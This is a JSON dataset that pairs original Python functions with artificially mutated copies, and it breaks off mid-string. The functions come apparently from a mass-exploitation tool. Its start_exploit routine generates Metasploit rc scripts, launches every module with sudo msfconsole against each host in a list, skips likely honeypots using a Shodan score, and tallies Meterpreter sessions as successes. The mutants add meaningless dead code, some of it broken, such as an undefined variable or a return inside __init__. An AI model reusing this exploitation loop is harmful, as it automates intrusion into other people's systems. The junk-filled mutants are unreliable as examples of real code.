[
    {
        "func_name": "whitelist_wash",
        "original": "def whitelist_wash(hosts, whitelist_file):\n    \"\"\"\n    remove IPs from hosts list that do not appear in WHITELIST_FILE\n    \"\"\"\n    try:\n        whitelist_hosts = [x.strip() for x in open(whitelist_file).readlines() if x.strip()]\n        lib.output.info('Found {} entries in whitelist.txt, scrubbing'.format(str(len(whitelist_hosts))))\n        washed_hosts = []\n        if len(whitelist_hosts) == 0:\n            return hosts\n        else:\n            for host in hosts:\n                if host.strip() in whitelist_hosts:\n                    washed_hosts.append(host)\n        return washed_hosts\n    except IOError:\n        lib.output.warning('unable to whitewash host list, does the file exist?')\n        return hosts",
        "mutated": [
            "def whitelist_wash(hosts, whitelist_file):\n    if False:\n        i = 10\n    '\\n    remove IPs from hosts list that do not appear in WHITELIST_FILE\\n    '\n    try:\n        whitelist_hosts = [x.strip() for x in open(whitelist_file).readlines() if x.strip()]\n        lib.output.info('Found {} entries in whitelist.txt, scrubbing'.format(str(len(whitelist_hosts))))\n        washed_hosts = []\n        if len(whitelist_hosts) == 0:\n            return hosts\n        else:\n            for host in hosts:\n                if host.strip() in whitelist_hosts:\n                    washed_hosts.append(host)\n        return washed_hosts\n    except IOError:\n        lib.output.warning('unable to whitewash host list, does the file exist?')\n        return hosts",
            "def whitelist_wash(hosts, whitelist_file):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n    remove IPs from hosts list that do not appear in WHITELIST_FILE\\n    '\n    try:\n        whitelist_hosts = [x.strip() for x in open(whitelist_file).readlines() if x.strip()]\n        lib.output.info('Found {} entries in whitelist.txt, scrubbing'.format(str(len(whitelist_hosts))))\n        washed_hosts = []\n        if len(whitelist_hosts) == 0:\n            return hosts\n        else:\n            for host in hosts:\n                if host.strip() in whitelist_hosts:\n                    washed_hosts.append(host)\n        return washed_hosts\n    except IOError:\n        lib.output.warning('unable to whitewash host list, does the file exist?')\n        return hosts",
            "def whitelist_wash(hosts, whitelist_file):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n    remove IPs from hosts list that do not appear in WHITELIST_FILE\\n    '\n    try:\n        whitelist_hosts = [x.strip() for x in open(whitelist_file).readlines() if x.strip()]\n        lib.output.info('Found {} entries in whitelist.txt, scrubbing'.format(str(len(whitelist_hosts))))\n        washed_hosts = []\n        if len(whitelist_hosts) == 0:\n            return hosts\n        else:\n            for host in hosts:\n                if host.strip() in whitelist_hosts:\n                    washed_hosts.append(host)\n        return washed_hosts\n    except IOError:\n        lib.output.warning('unable to whitewash host list, does the file exist?')\n        return hosts",
            "def whitelist_wash(hosts, whitelist_file):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n    remove IPs from hosts list that do not appear in WHITELIST_FILE\\n    '\n    try:\n        whitelist_hosts = [x.strip() for x in open(whitelist_file).readlines() if x.strip()]\n        lib.output.info('Found {} entries in whitelist.txt, scrubbing'.format(str(len(whitelist_hosts))))\n        washed_hosts = []\n        if len(whitelist_hosts) == 0:\n            return hosts\n        else:\n            for host in hosts:\n                if host.strip() in whitelist_hosts:\n                    washed_hosts.append(host)\n        return washed_hosts\n    except IOError:\n        lib.output.warning('unable to whitewash host list, does the file exist?')\n        return hosts",
            "def whitelist_wash(hosts, whitelist_file):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n    remove IPs from hosts list that do not appear in WHITELIST_FILE\\n    '\n    try:\n        whitelist_hosts = [x.strip() for x in open(whitelist_file).readlines() if x.strip()]\n        lib.output.info('Found {} entries in whitelist.txt, scrubbing'.format(str(len(whitelist_hosts))))\n        washed_hosts = []\n        if len(whitelist_hosts) == 0:\n            return hosts\n        else:\n            for host in hosts:\n                if host.strip() in whitelist_hosts:\n                    washed_hosts.append(host)\n        return washed_hosts\n    except IOError:\n        lib.output.warning('unable to whitewash host list, does the file exist?')\n        return hosts"
        ]
    },
    {
        "func_name": "__init__",
        "original": "def __init__(self, configuration, all_modules, hosts=None, **kwargs):\n    self.hosts = hosts\n    self.configuration = configuration\n    self.mods = all_modules\n    self.query = kwargs.get('query', lib.settings.QUERY_FILE_PATH)\n    self.query_file = open(self.query).read()\n    self.single = kwargs.get('single', None)\n    self.ruby_exec = kwargs.get('ruby_exec', False)\n    self.msf_path = kwargs.get('msf_path', None)\n    self.dry_run = kwargs.get('dryRun', False)\n    self.check_honey = kwargs.get('check_honey', False)\n    self.shodan_token = kwargs.get('shodan_token', None)\n    self.compare_honey = kwargs.get('compare_honey', 0.0)",
        "mutated": [
            "def __init__(self, configuration, all_modules, hosts=None, **kwargs):\n    if False:\n        i = 10\n    self.hosts = hosts\n    self.configuration = configuration\n    self.mods = all_modules\n    self.query = kwargs.get('query', lib.settings.QUERY_FILE_PATH)\n    self.query_file = open(self.query).read()\n    self.single = kwargs.get('single', None)\n    self.ruby_exec = kwargs.get('ruby_exec', False)\n    self.msf_path = kwargs.get('msf_path', None)\n    self.dry_run = kwargs.get('dryRun', False)\n    self.check_honey = kwargs.get('check_honey', False)\n    self.shodan_token = kwargs.get('shodan_token', None)\n    self.compare_honey = kwargs.get('compare_honey', 0.0)",
            "def __init__(self, configuration, all_modules, hosts=None, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.hosts = hosts\n    self.configuration = configuration\n    self.mods = all_modules\n    self.query = kwargs.get('query', lib.settings.QUERY_FILE_PATH)\n    self.query_file = open(self.query).read()\n    self.single = kwargs.get('single', None)\n    self.ruby_exec = kwargs.get('ruby_exec', False)\n    self.msf_path = kwargs.get('msf_path', None)\n    self.dry_run = kwargs.get('dryRun', False)\n    self.check_honey = kwargs.get('check_honey', False)\n    self.shodan_token = kwargs.get('shodan_token', None)\n    self.compare_honey = kwargs.get('compare_honey', 0.0)",
            "def __init__(self, configuration, all_modules, hosts=None, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.hosts = hosts\n    self.configuration = configuration\n    self.mods = all_modules\n    self.query = kwargs.get('query', lib.settings.QUERY_FILE_PATH)\n    self.query_file = open(self.query).read()\n    self.single = kwargs.get('single', None)\n    self.ruby_exec = kwargs.get('ruby_exec', False)\n    self.msf_path = kwargs.get('msf_path', None)\n    self.dry_run = kwargs.get('dryRun', False)\n    self.check_honey = kwargs.get('check_honey', False)\n    self.shodan_token = kwargs.get('shodan_token', None)\n    self.compare_honey = kwargs.get('compare_honey', 0.0)",
            "def __init__(self, configuration, all_modules, hosts=None, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.hosts = hosts\n    self.configuration = configuration\n    self.mods = all_modules\n    self.query = kwargs.get('query', lib.settings.QUERY_FILE_PATH)\n    self.query_file = open(self.query).read()\n    self.single = kwargs.get('single', None)\n    self.ruby_exec = kwargs.get('ruby_exec', False)\n    self.msf_path = kwargs.get('msf_path', None)\n    self.dry_run = kwargs.get('dryRun', False)\n    self.check_honey = kwargs.get('check_honey', False)\n    self.shodan_token = kwargs.get('shodan_token', None)\n    self.compare_honey = kwargs.get('compare_honey', 0.0)",
            "def __init__(self, configuration, all_modules, hosts=None, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.hosts = hosts\n    self.configuration = configuration\n    self.mods = all_modules\n    self.query = kwargs.get('query', lib.settings.QUERY_FILE_PATH)\n    self.query_file = open(self.query).read()\n    self.single = kwargs.get('single', None)\n    self.ruby_exec = kwargs.get('ruby_exec', False)\n    self.msf_path = kwargs.get('msf_path', None)\n    self.dry_run = kwargs.get('dryRun', False)\n    self.check_honey = kwargs.get('check_honey', False)\n    self.shodan_token = kwargs.get('shodan_token', None)\n    self.compare_honey = kwargs.get('compare_honey', 0.0)"
        ]
    },
    {
        "func_name": "view_sorted",
        "original": "def view_sorted(self):\n    \"\"\"\n        view the modules that have been sorted by the relevance\n        there is a chance this will display 0 (see TODO[1])\n        \"\"\"\n    for mod in self.sorted_modules:\n        print(mod)",
        "mutated": [
            "def view_sorted(self):\n    if False:\n        i = 10\n    '\\n        view the modules that have been sorted by the relevance\\n        there is a chance this will display 0 (see TODO[1])\\n        '\n    for mod in self.sorted_modules:\n        print(mod)",
            "def view_sorted(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        view the modules that have been sorted by the relevance\\n        there is a chance this will display 0 (see TODO[1])\\n        '\n    for mod in self.sorted_modules:\n        print(mod)",
            "def view_sorted(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        view the modules that have been sorted by the relevance\\n        there is a chance this will display 0 (see TODO[1])\\n        '\n    for mod in self.sorted_modules:\n        print(mod)",
            "def view_sorted(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        view the modules that have been sorted by the relevance\\n        there is a chance this will display 0 (see TODO[1])\\n        '\n    for mod in self.sorted_modules:\n        print(mod)",
            "def view_sorted(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        view the modules that have been sorted by the relevance\\n        there is a chance this will display 0 (see TODO[1])\\n        '\n    for mod in self.sorted_modules:\n        print(mod)"
        ]
    },
    {
        "func_name": "sort_modules_by_query",
        "original": "def sort_modules_by_query(self):\n    \"\"\"\n        sort modules by relevance after reading the query from the\n        temp file\n        \"\"\"\n    for mod in self.mods:\n        if self.query_file.strip() in mod:\n            self.sorted_modules.append(mod)\n    return self.sorted_modules",
        "mutated": [
            "def sort_modules_by_query(self):\n    if False:\n        i = 10\n    '\\n        sort modules by relevance after reading the query from the\\n        temp file\\n        '\n    for mod in self.mods:\n        if self.query_file.strip() in mod:\n            self.sorted_modules.append(mod)\n    return self.sorted_modules",
            "def sort_modules_by_query(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        sort modules by relevance after reading the query from the\\n        temp file\\n        '\n    for mod in self.mods:\n        if self.query_file.strip() in mod:\n            self.sorted_modules.append(mod)\n    return self.sorted_modules",
            "def sort_modules_by_query(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        sort modules by relevance after reading the query from the\\n        temp file\\n        '\n    for mod in self.mods:\n        if self.query_file.strip() in mod:\n            self.sorted_modules.append(mod)\n    return self.sorted_modules",
            "def sort_modules_by_query(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        sort modules by relevance after reading the query from the\\n        temp file\\n        '\n    for mod in self.mods:\n        if self.query_file.strip() in mod:\n            self.sorted_modules.append(mod)\n    return self.sorted_modules",
            "def sort_modules_by_query(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        sort modules by relevance after reading the query from the\\n        temp file\\n        '\n    for mod in self.mods:\n        if self.query_file.strip() in mod:\n            self.sorted_modules.append(mod)\n    return self.sorted_modules"
        ]
    },
    {
        "func_name": "start_exploit",
        "original": "def start_exploit(self, sep='*' * 10):\n    \"\"\"\n        start the exploit, there is still no rollover but it's being worked\n        \"\"\"\n    if self.dry_run:\n        lib.settings.close('dry run was initiated, exploitation will not be done')\n    today_printable = datetime.datetime.today().strftime('%Y-%m-%d_%Hh%Mm%Ss')\n    current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable)\n    try:\n        makedirs(current_run_path)\n    except OSError:\n        current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable + '(1)')\n        makedirs(current_run_path)\n    report_path = path.join(current_run_path, 'report.csv')\n    with open(report_path, 'w') as f:\n        csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n        csv_file.writerow(['Target Host', 'Date (UTC)', 'MSF Module', 'LocalHost', 'Listening Port', 'Successful Logs', 'Failure Logs', 'All Logs'])\n    lib.output.info('Launching exploits against {hosts_len} hosts:'.format(hosts_len=len(self.hosts)))\n    win_total = 0\n    fail_total = 0\n    skip_amount = 0\n    lib.settings.MSF_LAUNCHED = True\n    for host in self.hosts:\n        host = host.strip()\n        if self.check_honey:\n            lib.output.misc_info('checking if {} is a honeypot'.format(host))\n            honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()\n            if honey_score < self.compare_honey:\n                lib.output.warning('honeypot score ({}) is above (or equal to) requested, skipping target'.format(honey_score))\n                skip = True\n                skip_amount += 1\n            else:\n                lib.output.misc_info('{} does not appear to be a honeypot, continuing attack'.format(host))\n                skip = False\n        else:\n            skip = False\n        if not skip:\n            current_host_path = path.join(current_run_path, host.strip())\n            try:\n                makedirs(current_host_path)\n            except OSError:\n                pass\n            for mod in self.mods:\n                if not self.dry_run:\n                    lib.output.info(\"launching exploit '{}' against host '{}'\".format(mod.strip(), host.strip()))\n                cmd_template = 'sudo {use_ruby} {msf_path} -r {rc_script_path} -q'\n                use_ruby = 'ruby' if self.ruby_exec else ''\n                msf_path = self.msf_path if self.msf_path is not None else 'msfconsole'\n                rc_script_template = 'workspace -a {workspace}\\nuse {module_name}\\nsetg lhost {lhost}\\nsetg lport {lport}\\nsetg verbose true\\nsetg threads 20\\nset rhost {rhost}\\nset rhosts {rhosts}\\nrun -z\\nexit -y\\n'\n                module_name = mod.strip()\n                workspace = self.configuration[0]\n                lhost = self.configuration[1]\n                lport = self.configuration[2]\n                rhost = host.strip()\n                current_rc_script_path = path.join(current_host_path, mod.replace('/', '-').strip())\n                with open(current_rc_script_path, 'w') as f:\n                    f.writelines(rc_script_template.format(module_name=module_name, workspace=workspace, lhost=lhost, lport=lport, rhost=rhost, rhosts=rhost))\n                with open(report_path, 'a') as f:\n                    cmd = cmd_template.format(use_ruby=use_ruby, msf_path=msf_path, rc_script_path=current_rc_script_path)\n                    output = ['']\n                    if not self.dry_run:\n                        output = lib.settings.cmdline(cmd)\n                    ansi_escape = re.compile('\\\\x1B\\\\[[0-?]*[ -/]*[@-~]')\n                    msf_output_lines = [ansi_escape.sub('', x) for x in output if re.search('\\\\[.\\\\]', x)]\n                    msf_wins = [x for x in msf_output_lines if re.search('\\\\[\\\\+\\\\]', x) or 'Meterpreter' in x or 'Session' in x or ('Sending stage' in x)]\n                    msf_fails = [x for x in msf_output_lines if re.search('\\\\[-\\\\]', x) and 'Background' not in x]\n                    if len(msf_wins):\n                        win_total += 1\n                    if len(msf_fails):\n                        fail_total += 1\n                    csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n                    csv_file.writerow([rhost, today_printable, module_name, lhost, lport, linesep.join(msf_wins), linesep.join(msf_fails), linesep.join(msf_output_lines)])\n    print('')\n    lib.output.info('{}RESULTS{}'.format(sep, sep))\n    if self.dry_run:\n        lib.output.info('\\tDRY RUN!')\n        lib.output.info('\\t0 exploits run against {} hosts.'.format(len(self.hosts)))\n    else:\n        lib.output.info('\\t{} exploits run against {} hosts.'.format(len(self.mods), len(self.hosts) - skip_amount))\n        lib.output.info('\\t{} exploit successful (Check report.csv to validate!).'.format(win_total))\n        lib.output.info('\\t{} exploit failed.'.format(fail_total))\n    lib.output.info('\\tExploit run saved to {}'.format(str(current_run_path)))\n    lib.output.info('\\tReport saved to {}'.format(str(report_path)))",
        "mutated": [
            "def start_exploit(self, sep='*' * 10):\n    if False:\n        i = 10\n    \"\\n        start the exploit, there is still no rollover but it's being worked\\n        \"\n    if self.dry_run:\n        lib.settings.close('dry run was initiated, exploitation will not be done')\n    today_printable = datetime.datetime.today().strftime('%Y-%m-%d_%Hh%Mm%Ss')\n    current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable)\n    try:\n        makedirs(current_run_path)\n    except OSError:\n        current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable + '(1)')\n        makedirs(current_run_path)\n    report_path = path.join(current_run_path, 'report.csv')\n    with open(report_path, 'w') as f:\n        csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n        csv_file.writerow(['Target Host', 'Date (UTC)', 'MSF Module', 'LocalHost', 'Listening Port', 'Successful Logs', 'Failure Logs', 'All Logs'])\n    lib.output.info('Launching exploits against {hosts_len} hosts:'.format(hosts_len=len(self.hosts)))\n    win_total = 0\n    fail_total = 0\n    skip_amount = 0\n    lib.settings.MSF_LAUNCHED = True\n    for host in self.hosts:\n        host = host.strip()\n        if self.check_honey:\n            lib.output.misc_info('checking if {} is a honeypot'.format(host))\n            honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()\n            if honey_score < self.compare_honey:\n                lib.output.warning('honeypot score ({}) is above (or equal to) requested, skipping target'.format(honey_score))\n                skip = True\n                skip_amount += 1\n            else:\n                lib.output.misc_info('{} does not appear to be a honeypot, continuing attack'.format(host))\n                skip = False\n        else:\n            skip = False\n        if not skip:\n            current_host_path = path.join(current_run_path, host.strip())\n            try:\n                makedirs(current_host_path)\n            except OSError:\n                pass\n            for mod in self.mods:\n                if not self.dry_run:\n                    lib.output.info(\"launching exploit '{}' against host '{}'\".format(mod.strip(), host.strip()))\n                cmd_template = 'sudo {use_ruby} {msf_path} -r {rc_script_path} -q'\n                use_ruby = 'ruby' if self.ruby_exec else ''\n                msf_path = self.msf_path if self.msf_path is not None else 'msfconsole'\n                rc_script_template = 'workspace -a {workspace}\\nuse {module_name}\\nsetg lhost {lhost}\\nsetg lport {lport}\\nsetg verbose true\\nsetg threads 20\\nset rhost {rhost}\\nset rhosts {rhosts}\\nrun -z\\nexit -y\\n'\n                module_name = mod.strip()\n                workspace = self.configuration[0]\n                lhost = self.configuration[1]\n                lport = self.configuration[2]\n                rhost = host.strip()\n                current_rc_script_path = path.join(current_host_path, mod.replace('/', '-').strip())\n                with open(current_rc_script_path, 'w') as f:\n                    f.writelines(rc_script_template.format(module_name=module_name, workspace=workspace, lhost=lhost, lport=lport, rhost=rhost, rhosts=rhost))\n                with open(report_path, 'a') as f:\n                    cmd = cmd_template.format(use_ruby=use_ruby, msf_path=msf_path, rc_script_path=current_rc_script_path)\n                    output = ['']\n                    if not self.dry_run:\n                        output = lib.settings.cmdline(cmd)\n                    ansi_escape = re.compile('\\\\x1B\\\\[[0-?]*[ -/]*[@-~]')\n                    msf_output_lines = [ansi_escape.sub('', x) for x in output if re.search('\\\\[.\\\\]', x)]\n                    msf_wins = [x for x in msf_output_lines if re.search('\\\\[\\\\+\\\\]', x) or 'Meterpreter' in x or 'Session' in x or ('Sending stage' in x)]\n                    msf_fails = [x for x in msf_output_lines if re.search('\\\\[-\\\\]', x) and 'Background' not in x]\n                    if len(msf_wins):\n                        win_total += 1\n                    if len(msf_fails):\n                        fail_total += 1\n                    csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n                    csv_file.writerow([rhost, today_printable, module_name, lhost, lport, linesep.join(msf_wins), linesep.join(msf_fails), linesep.join(msf_output_lines)])\n    print('')\n    lib.output.info('{}RESULTS{}'.format(sep, sep))\n    if self.dry_run:\n        lib.output.info('\\tDRY RUN!')\n        lib.output.info('\\t0 exploits run against {} hosts.'.format(len(self.hosts)))\n    else:\n        lib.output.info('\\t{} exploits run against {} hosts.'.format(len(self.mods), len(self.hosts) - skip_amount))\n        lib.output.info('\\t{} exploit successful (Check report.csv to validate!).'.format(win_total))\n        lib.output.info('\\t{} exploit failed.'.format(fail_total))\n    lib.output.info('\\tExploit run saved to {}'.format(str(current_run_path)))\n    lib.output.info('\\tReport saved to {}'.format(str(report_path)))",
            "def start_exploit(self, sep='*' * 10):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    \"\\n        start the exploit, there is still no rollover but it's being worked\\n        \"\n    if self.dry_run:\n        lib.settings.close('dry run was initiated, exploitation will not be done')\n    today_printable = datetime.datetime.today().strftime('%Y-%m-%d_%Hh%Mm%Ss')\n    current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable)\n    try:\n        makedirs(current_run_path)\n    except OSError:\n        current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable + '(1)')\n        makedirs(current_run_path)\n    report_path = path.join(current_run_path, 'report.csv')\n    with open(report_path, 'w') as f:\n        csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n        csv_file.writerow(['Target Host', 'Date (UTC)', 'MSF Module', 'LocalHost', 'Listening Port', 'Successful Logs', 'Failure Logs', 'All Logs'])\n    lib.output.info('Launching exploits against {hosts_len} hosts:'.format(hosts_len=len(self.hosts)))\n    win_total = 0\n    fail_total = 0\n    skip_amount = 0\n    lib.settings.MSF_LAUNCHED = True\n    for host in self.hosts:\n        host = host.strip()\n        if self.check_honey:\n            lib.output.misc_info('checking if {} is a honeypot'.format(host))\n            honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()\n            if honey_score < self.compare_honey:\n                lib.output.warning('honeypot score ({}) is above (or equal to) requested, skipping target'.format(honey_score))\n                skip = True\n                skip_amount += 1\n            else:\n                lib.output.misc_info('{} does not appear to be a honeypot, continuing attack'.format(host))\n                skip = False\n        else:\n            skip = False\n        if not skip:\n            current_host_path = path.join(current_run_path, host.strip())\n            try:\n                makedirs(current_host_path)\n            except OSError:\n                pass\n            for mod in self.mods:\n                if not self.dry_run:\n                    lib.output.info(\"launching exploit '{}' against host '{}'\".format(mod.strip(), host.strip()))\n                cmd_template = 'sudo {use_ruby} {msf_path} -r {rc_script_path} -q'\n                use_ruby = 'ruby' if self.ruby_exec else ''\n                msf_path = self.msf_path if self.msf_path is not None else 'msfconsole'\n                rc_script_template = 'workspace -a {workspace}\\nuse {module_name}\\nsetg lhost {lhost}\\nsetg lport {lport}\\nsetg verbose true\\nsetg threads 20\\nset rhost {rhost}\\nset rhosts {rhosts}\\nrun -z\\nexit -y\\n'\n                module_name = mod.strip()\n                workspace = self.configuration[0]\n                lhost = self.configuration[1]\n                lport = self.configuration[2]\n                rhost = host.strip()\n                current_rc_script_path = path.join(current_host_path, mod.replace('/', '-').strip())\n                with open(current_rc_script_path, 'w') as f:\n                    f.writelines(rc_script_template.format(module_name=module_name, workspace=workspace, lhost=lhost, lport=lport, rhost=rhost, rhosts=rhost))\n                with open(report_path, 'a') as f:\n                    cmd = cmd_template.format(use_ruby=use_ruby, msf_path=msf_path, rc_script_path=current_rc_script_path)\n                    output = ['']\n                    if not self.dry_run:\n                        output = lib.settings.cmdline(cmd)\n                    ansi_escape = re.compile('\\\\x1B\\\\[[0-?]*[ -/]*[@-~]')\n                    msf_output_lines = [ansi_escape.sub('', x) for x in output if re.search('\\\\[.\\\\]', x)]\n                    msf_wins = [x for x in msf_output_lines if re.search('\\\\[\\\\+\\\\]', x) or 'Meterpreter' in x or 'Session' in x or ('Sending stage' in x)]\n                    msf_fails = [x for x in msf_output_lines if re.search('\\\\[-\\\\]', x) and 'Background' not in x]\n                    if len(msf_wins):\n                        win_total += 1\n                    if len(msf_fails):\n                        fail_total += 1\n                    csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n                    csv_file.writerow([rhost, today_printable, module_name, lhost, lport, linesep.join(msf_wins), linesep.join(msf_fails), linesep.join(msf_output_lines)])\n    print('')\n    lib.output.info('{}RESULTS{}'.format(sep, sep))\n    if self.dry_run:\n        lib.output.info('\\tDRY RUN!')\n        lib.output.info('\\t0 exploits run against {} hosts.'.format(len(self.hosts)))\n    else:\n        lib.output.info('\\t{} exploits run against {} hosts.'.format(len(self.mods), len(self.hosts) - skip_amount))\n        lib.output.info('\\t{} exploit successful (Check report.csv to validate!).'.format(win_total))\n        lib.output.info('\\t{} exploit failed.'.format(fail_total))\n    lib.output.info('\\tExploit run saved to {}'.format(str(current_run_path)))\n    lib.output.info('\\tReport saved to {}'.format(str(report_path)))",
            "def start_exploit(self, sep='*' * 10):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    \"\\n        start the exploit, there is still no rollover but it's being worked\\n        \"\n    if self.dry_run:\n        lib.settings.close('dry run was initiated, exploitation will not be done')\n    today_printable = datetime.datetime.today().strftime('%Y-%m-%d_%Hh%Mm%Ss')\n    current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable)\n    try:\n        makedirs(current_run_path)\n    except OSError:\n        current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable + '(1)')\n        makedirs(current_run_path)\n    report_path = path.join(current_run_path, 'report.csv')\n    with open(report_path, 'w') as f:\n        csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n        csv_file.writerow(['Target Host', 'Date (UTC)', 'MSF Module', 'LocalHost', 'Listening Port', 'Successful Logs', 'Failure Logs', 'All Logs'])\n    lib.output.info('Launching exploits against {hosts_len} hosts:'.format(hosts_len=len(self.hosts)))\n    win_total = 0\n    fail_total = 0\n    skip_amount = 0\n    lib.settings.MSF_LAUNCHED = True\n    for host in self.hosts:\n        host = host.strip()\n        if self.check_honey:\n            lib.output.misc_info('checking if {} is a honeypot'.format(host))\n            honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()\n            if honey_score < self.compare_honey:\n                lib.output.warning('honeypot score ({}) is above (or equal to) requested, skipping target'.format(honey_score))\n                skip = True\n                skip_amount += 1\n            else:\n                lib.output.misc_info('{} does not appear to be a honeypot, continuing attack'.format(host))\n                skip = False\n        else:\n            skip = False\n        if not skip:\n            current_host_path = path.join(current_run_path, host.strip())\n            try:\n                makedirs(current_host_path)\n            except OSError:\n                pass\n            for mod in self.mods:\n                if not self.dry_run:\n                    lib.output.info(\"launching exploit '{}' against host '{}'\".format(mod.strip(), host.strip()))\n                cmd_template = 'sudo {use_ruby} {msf_path} -r {rc_script_path} -q'\n                use_ruby = 'ruby' if self.ruby_exec else ''\n                msf_path = self.msf_path if self.msf_path is not None else 'msfconsole'\n                rc_script_template = 'workspace -a {workspace}\\nuse {module_name}\\nsetg lhost {lhost}\\nsetg lport {lport}\\nsetg verbose true\\nsetg threads 20\\nset rhost {rhost}\\nset rhosts {rhosts}\\nrun -z\\nexit -y\\n'\n                module_name = mod.strip()\n                workspace = self.configuration[0]\n                lhost = self.configuration[1]\n                lport = self.configuration[2]\n                rhost = host.strip()\n                current_rc_script_path = path.join(current_host_path, mod.replace('/', '-').strip())\n                with open(current_rc_script_path, 'w') as f:\n                    f.writelines(rc_script_template.format(module_name=module_name, workspace=workspace, lhost=lhost, lport=lport, rhost=rhost, rhosts=rhost))\n                with open(report_path, 'a') as f:\n                    cmd = cmd_template.format(use_ruby=use_ruby, msf_path=msf_path, rc_script_path=current_rc_script_path)\n                    output = ['']\n                    if not self.dry_run:\n                        output = lib.settings.cmdline(cmd)\n                    ansi_escape = re.compile('\\\\x1B\\\\[[0-?]*[ -/]*[@-~]')\n                    msf_output_lines = 